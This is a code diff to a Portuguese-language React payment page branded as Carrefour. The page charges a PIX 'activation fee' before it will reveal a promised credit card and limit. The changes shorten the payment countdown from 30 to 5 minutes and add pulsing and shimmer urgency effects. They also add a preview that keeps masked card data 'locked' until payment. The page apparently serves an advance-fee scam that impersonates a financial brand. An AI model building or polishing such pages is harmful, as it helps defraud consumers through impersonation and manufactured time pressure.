@@ -6,7 +6,8 @@ import { trackPurchase } from '../../services/facebookPixel';
 import ProgressBar from '../Shared/ProgressBar';
 import Logo from '../Shared/Logo';
 import { QRCodeSVG } from 'qrcode.react';
-import { Loader2, Copy, CheckCircle, Shield, Lock, ChevronDown, ChevronUp, Clock, FileText, AlertCircle } from 'lucide-react';
+import { Loader2, Copy, CheckCircle, Shield, Lock, ChevronDown, ChevronUp, Clock, FileText, AlertCircle, EyeOff, CreditCard, TrendingUp } from 'lucide-react';
+import CardDesign from '../Shared/CardDesign';
 
 export default function PaymentPage() {
   const { 
@@ -18,14 +19,15 @@ export default function PaymentPage() {
     setPixData,
     pixCode,
     pixQrCode,
-    transactionId
+    transactionId,
+    limite
   } = useUserStore();
 
   const [loading, setLoading] = useState(false);
   const [pixGerado, setPixGerado] = useState(!!pixCode);
   const [copiado, setCopiado] = useState(false);
   const [qrCodeExpandido, setQrCodeExpandido] = useState(false);
-  const [tempoRestante, setTempoRestante] = useState(30 * 60);
+  const [tempoRestante, setTempoRestante] = useState(5 * 60);
 
   // Verificar localStorage ao carregar
   useEffect(() => {
@@ -42,7 +44,8 @@ export default function PaymentPage() {
           setPixGerado(true);
           
           const diferenca = Math.max(0, Math.floor((expiraEm - agora) / 1000));
-          setTempoRestante(diferenca);
+          // Limitar a 5 minutos máximo
+          setTempoRestante(Math.min(diferenca, 5 * 60));
           return;
         } else {
           localStorage.removeItem('pix_data');
@@ -109,11 +112,12 @@ export default function PaymentPage() {
       setPixData(resultado.pixCode, resultado.qrCode, resultado.transactionId);
       setPixGerado(true);
       
-      const expiresAt = resultado.expiresAt || new Date(Date.now() + 30 * 60 * 1000).toISOString();
+      const expiresAt = resultado.expiresAt || new Date(Date.now() + 5 * 60 * 1000).toISOString();
       const expiraEm = new Date(expiresAt).getTime();
       const agora = new Date().getTime();
       const diferenca = Math.max(0, Math.floor((expiraEm - agora) / 1000));
-      setTempoRestante(diferenca);
+      // Limitar a 5 minutos máximo
+      setTempoRestante(Math.min(diferenca, 5 * 60));
       
       localStorage.setItem('pix_data', JSON.stringify({
         pixCode: resultado.pixCode,
@@ -133,11 +137,11 @@ export default function PaymentPage() {
           transactionId: 'TXN' + Date.now(),
           pixCode: '00020126580014BR.GOV.BCB.PIX0136123e4567-e89b-12d3-a456-426614174000520400005303986540525.505802BR5925CARREFOUR SOLUCOES FINAN6009SAO PAULO62070503***6304',
           qrCode: '00020126580014BR.GOV.BCB.PIX0136123e4567-e89b-12d3-a456-426614174000520400005303986540525.505802BR5925CARREFOUR SOLUCOES FINAN6009SAO PAULO62070503***6304',
-          expiresAt: new Date(Date.now() + 30 * 60 * 1000).toISOString()
+          expiresAt: new Date(Date.now() + 5 * 60 * 1000).toISOString()
         };
         setPixData(mockResult.pixCode, mockResult.qrCode, mockResult.transactionId);
         setPixGerado(true);
-        setTempoRestante(30 * 60);
+        setTempoRestante(5 * 60);
         localStorage.setItem('pix_data', JSON.stringify({
           pixCode: mockResult.pixCode,
           pixQrCode: mockResult.qrCode,
@@ -185,20 +189,116 @@ export default function PaymentPage() {
           <div className="grid md:grid-cols-3 gap-6">
             {/* Coluna Principal - PIX */}
             <div className="md:col-span-2 space-y-6">
-              {/* Timer */}
+              {/* Timer Sofisticado */}
               {pixGerado && pixCode && tempoRestante > 0 && (
-                <div className="bg-gradient-to-r from-green-600 to-green-700 rounded-lg p-5 text-white shadow-lg">
-                  <div className="flex items-center justify-between">
-                    <div className="flex items-center gap-3">
-                      <Clock className="w-6 h-6" />
-                      <div>
-                        <p className="text-sm text-white/90">Tempo restante</p>
-                        <p className="text-3xl font-bold font-mono">{formatarTempo(tempoRestante)}</p>
+                <motion.div
+                  initial={{ opacity: 0, scale: 0.95 }}
+                  animate={{ opacity: 1, scale: 1 }}
+                  className="relative bg-gradient-to-br from-green-600 via-green-500 to-green-700 rounded-xl py-4 px-5 text-white shadow-2xl overflow-hidden"
+                >
+                  {/* Efeito de brilho animado */}
+                  <div className="absolute inset-0 bg-gradient-to-r from-transparent via-white/20 to-transparent animate-shimmer"></div>
+                  
+                  {/* Padrão de fundo */}
+                  <div className="absolute inset-0 opacity-10">
+                    <div className="absolute inset-0" style={{
+                      backgroundImage: 'radial-gradient(circle at 2px 2px, white 1px, transparent 0)',
+                      backgroundSize: '24px 24px'
+                    }}></div>
+                  </div>
+
+                  <div className="relative z-10">
+                    <div className="flex items-center justify-between gap-6">
+                      {/* Lado Esquerdo - Ícone e Label */}
+                      <div className="flex items-center gap-3">
+                        <div className="relative">
+                          <div className="w-12 h-12 bg-white/20 backdrop-blur-sm rounded-full flex items-center justify-center border-2 border-white/30">
+                            <Clock className="w-6 h-6" />
+                          </div>
+                        </div>
+                        <div>
+                          <p className="text-xs text-white/80 uppercase tracking-wider font-semibold mb-1">
+                            Tempo Restante
+                          </p>
+                          <p className="text-sm text-white/90">
+                            Complete o pagamento antes do vencimento
+                          </p>
+                        </div>
+                      </div>
+
+                      {/* Centro - Timer Principal */}
+                      <div className="flex-1 flex items-center justify-center">
+                        <div className="relative flex items-center justify-center">
+                          {/* Círculo de progresso */}
+                          <svg className="w-24 h-24 transform -rotate-90" viewBox="0 0 100 100">
+                            <circle
+                              cx="50"
+                              cy="50"
+                              r="42"
+                              fill="none"
+                              stroke="rgba(255,255,255,0.2)"
+                              strokeWidth="4"
+                            />
+                            <motion.circle
+                              cx="50"
+                              cy="50"
+                              r="42"
+                              fill="none"
+                              stroke="white"
+                              strokeWidth="4"
+                              strokeLinecap="round"
+                              strokeDasharray={`${2 * Math.PI * 42}`}
+                              initial={{ strokeDashoffset: 2 * Math.PI * 42 }}
+                              animate={{ 
+                                strokeDashoffset: (2 * Math.PI * 42) * (1 - (tempoRestante / (5 * 60)))
+                              }}
+                              transition={{ duration: 1, ease: "linear" }}
+                            />
+                          </svg>
+                          
+                          {/* Tempo centralizado */}
+                          <div className="absolute inset-0 flex flex-col items-center justify-center">
+                            <p className="text-xl font-bold font-mono tracking-wider drop-shadow-lg leading-tight">
+                              {formatarTempo(tempoRestante)}
+                            </p>
+                            <div className="flex items-center justify-center gap-1 mt-0.5">
+                              <span className="text-[9px] text-white/70">min</span>
+                              <span className="text-[9px] text-white/70">seg</span>
+                            </div>
+                          </div>
+                        </div>
+                      </div>
+
+                      {/* Lado Direito - Alerta */}
+                      <div className="flex-shrink-0">
+                        <div className="w-12 h-12 bg-white/20 backdrop-blur-sm rounded-full flex items-center justify-center border-2 border-white/30">
+                          <AlertCircle className="w-6 h-6" />
+                        </div>
                       </div>
                     </div>
-                    <AlertCircle className="w-6 h-6 text-white/80" />
+
+                    {/* Barra de progresso inferior */}
+                    <div className="mt-2 h-1 bg-white/20 rounded-full overflow-hidden">
+                      <motion.div
+                        className="h-full bg-white rounded-full"
+                        initial={{ width: '100%' }}
+                        animate={{ width: `${(tempoRestante / (5 * 60)) * 100}%` }}
+                        transition={{ duration: 1, ease: "linear" }}
+                      />
+                    </div>
                   </div>
-                </div>
+
+                  {/* Efeito de brilho pulsante */}
+                  <style>{`
+                    @keyframes shimmer {
+                      0% { transform: translateX(-100%); }
+                      100% { transform: translateX(100%); }
+                    }
+                    .animate-shimmer {
+                      animation: shimmer 3s infinite;
+                    }
+                  `}</style>
+                </motion.div>
               )}
 
               {/* Card de Pagamento */}
@@ -209,34 +309,42 @@ export default function PaymentPage() {
                   <p className="text-sm text-gray-600 mt-2">Aguarde alguns instantes</p>
                 </div>
               ) : pixGerado && pixCode ? (
-                <div className="bg-white rounded-lg shadow-sm border-2 border-carrefour-blue overflow-hidden">
+                <div className="bg-white rounded-lg shadow-sm border-2 border-carrefour-blue overflow-hidden w-full max-w-full">
                   {/* Header do Card */}
                   <div className="bg-gradient-to-r from-carrefour-blue to-primary-dark px-6 py-4">
-                    <div className="flex items-center justify-between text-white">
-                      <div>
+                    <div className="flex items-center justify-between text-white gap-4">
+                      <div className="flex-1 min-w-0">
                         <p className="text-sm text-white/90 mb-1">Pagamento via PIX</p>
-                        <p className="text-2xl font-bold">R$ {(valorEntrega || 25.50).toFixed(2).replace('.', ',')}</p>
+                        <p className="text-2xl font-bold truncate">R$ {(valorEntrega || 25.50).toFixed(2).replace('.', ',')}</p>
                       </div>
-                      <div className="text-right">
+                      <div className="text-right flex-shrink-0">
                         <p className="text-xs text-white/80 mb-1">ID da Transação</p>
-                        <p className="text-sm font-mono">{transactionId?.substring(0, 8) || 'N/A'}...</p>
+                        <p className="text-sm font-mono truncate">{transactionId?.substring(0, 8) || 'N/A'}...</p>
                       </div>
                     </div>
                   </div>
 
-                  <div className="p-6">
+                  <div className="p-6 w-full max-w-full">
                     {/* Código PIX */}
                     <div className="mb-6">
                       <label className="block text-sm font-semibold text-gray-700 mb-2">
                         Código PIX (Copie e cole no app do seu banco)
                       </label>
-                      <div className="bg-gray-50 border-2 border-gray-200 rounded-lg p-4 mb-3">
-                        <p className="text-sm font-mono text-gray-900 break-all select-all leading-relaxed">
-                          {pixCode}
+                      <div className="bg-gray-50 border-2 border-gray-200 rounded-lg p-3 mb-3 w-full">
+                        <p className="text-xs font-mono text-gray-900 truncate select-all">
+                          {pixCode ? `${pixCode.substring(0, 60)}...` : 'Gerando código...'}
                         </p>
                       </div>
-                      <button
+                      <motion.button
                         onClick={handleCopiarPix}
+                        animate={!copiado ? {
+                          scale: [1, 1.02, 1],
+                        } : {}}
+                        transition={{
+                          duration: 2,
+                          repeat: Infinity,
+                          ease: "easeInOut"
+                        }}
                         className="w-full bg-green-600 hover:bg-green-700 text-white font-semibold py-3.5 px-4 rounded-lg transition-colors flex items-center justify-center gap-2"
                       >
                         {copiado ? (
@@ -250,7 +358,7 @@ export default function PaymentPage() {
                             Copiar Código PIX
                           </>
                         )}
-                      </button>
+                      </motion.button>
                     </div>
 
                     {/* QR Code Expansível */}
@@ -390,6 +498,125 @@ export default function PaymentPage() {
               </div>
             </div>
           </div>
+
+          {/* Preview do Cartão - Só mostra no localhost */}
+          {(import.meta.env.DEV || window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1') && (
+            <motion.div
+              initial={{ opacity: 0, y: 20 }}
+              animate={{ opacity: 1, y: 0 }}
+              transition={{ delay: 0.3 }}
+              className="mt-12 space-y-6"
+            >
+              {/* Header */}
+              <div className="bg-white rounded-xl shadow-lg border border-gray-200 p-6">
+                <div className="text-center mb-6">
+                  <div className="inline-flex items-center justify-center gap-3 mb-4">
+                    <div className="w-12 h-12 bg-gray-100 rounded-full flex items-center justify-center">
+                      <EyeOff className="w-6 h-6 text-gray-600" />
+                    </div>
+                    <div className="text-left">
+                      <h3 className="text-lg font-bold text-gray-900">Seu Cartão Carrefour</h3>
+                      <p className="text-sm text-gray-600">Dados serão liberados após pagamento</p>
+                    </div>
+                  </div>
+                  <div className="bg-amber-50 border border-amber-200 rounded-lg p-4">
+                    <p className="text-sm text-amber-900 flex items-center justify-center gap-2">
+                      <Lock className="w-4 h-4" />
+                      <span>Complete o pagamento da taxa de ativação para visualizar os dados do seu cartão</span>
+                    </p>
+                  </div>
+                </div>
+              </div>
+
+              <div className="grid md:grid-cols-2 gap-6">
+                {/* Card Preview */}
+                <div className="bg-white rounded-xl shadow-lg border border-gray-200 p-6">
+                  <div className="max-w-md mx-auto">
+                    <CardDesign
+                      nome={nomeCompleto || 'NOME DO TITULAR'}
+                      numero="5442 34•• •••• ••••"
+                      validade="••/••"
+                      cvv={null}
+                      mostrarCvv={false}
+                    />
+                  </div>
+                  <div className="mt-6 text-center">
+                    <div className="inline-flex items-center gap-2 text-sm text-gray-600 bg-gray-50 px-4 py-2 rounded-lg">
+                      <EyeOff className="w-4 h-4 text-gray-500" />
+                      <span>Dados protegidos até confirmação do pagamento</span>
+                    </div>
+                  </div>
+                </div>
+
+                {/* Informações do Cartão */}
+                <div className="space-y-6">
+                  {/* Limite */}
+                  <div className="bg-gradient-to-br from-green-500 to-green-600 rounded-xl p-6 text-white shadow-xl">
+                    <div className="flex items-center gap-3 mb-4">
+                      <TrendingUp className="w-6 h-6" />
+                      <div>
+                        <p className="text-white/90 text-xs font-semibold uppercase tracking-wide">Limite Disponível</p>
+                        <p className="text-3xl font-bold">{limite ? `R$ ${limite}` : 'R$ ••••'}</p>
+                      </div>
+                    </div>
+                    <div className="bg-white/20 backdrop-blur-sm rounded-lg p-3 flex items-center justify-center gap-2">
+                      <EyeOff className="w-4 h-4" />
+                      <span className="font-semibold text-sm">Valor será liberado após pagamento</span>
+                    </div>
+                  </div>
+
+                  {/* Barra de Limite */}
+                  <div className="bg-white rounded-xl shadow-lg border border-gray-200 p-6">
+                    <div className="flex items-center justify-between mb-3">
+                      <div className="flex items-center gap-2">
+                        <CreditCard className="w-5 h-5 text-carrefour-blue" />
+                        <h4 className="font-semibold text-gray-900">Limite do Cartão</h4>
+                      </div>
+                      <span className="text-sm text-gray-600 font-mono">•••• / ••••</span>
+                    </div>
+                    <div className="w-full bg-gray-200 rounded-full h-3 mb-2">
+                      <div className="bg-gradient-to-r from-green-500 to-green-600 h-3 rounded-full" style={{ width: '100%' }}>
+                        <div className="bg-white/30 h-full rounded-full"></div>
+                      </div>
+                    </div>
+                    <div className="flex justify-between text-xs text-gray-600">
+                      <span>Utilizado: R$ •••</span>
+                      <span>Disponível: R$ •••</span>
+                    </div>
+                  </div>
+
+                  {/* Informações Adicionais */}
+                  <div className="bg-white rounded-xl shadow-lg border border-gray-200 p-6">
+                    <h4 className="font-semibold text-gray-900 mb-4 flex items-center gap-2">
+                      <CreditCard className="w-5 h-5 text-carrefour-blue" />
+                      Informações do Cartão
+                    </h4>
+                    <div className="space-y-3">
+                      <div className="flex items-center justify-between p-3 bg-gray-50 rounded-lg">
+                        <span className="text-sm text-gray-600">Número do Cartão</span>
+                        <span className="font-mono text-sm text-gray-900">5442 34•• •••• ••••</span>
+                      </div>
+                      <div className="flex items-center justify-between p-3 bg-gray-50 rounded-lg">
+                        <span className="text-sm text-gray-600">CVV</span>
+                        <span className="font-mono text-sm text-gray-900">•••</span>
+                      </div>
+                      <div className="flex items-center justify-between p-3 bg-gray-50 rounded-lg">
+                        <span className="text-sm text-gray-600">Validade</span>
+                        <span className="font-mono text-sm text-gray-900">••/••</span>
+                      </div>
+                      <div className="flex items-center justify-between p-3 bg-gray-50 rounded-lg">
+                        <span className="text-sm text-gray-600">Status</span>
+                        <span className="text-sm font-semibold text-amber-600 flex items-center gap-1">
+                          <Lock className="w-3 h-3" />
+                          Aguardando Pagamento
+                        </span>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </motion.div>
+          )}
 
         </div>
       </div>
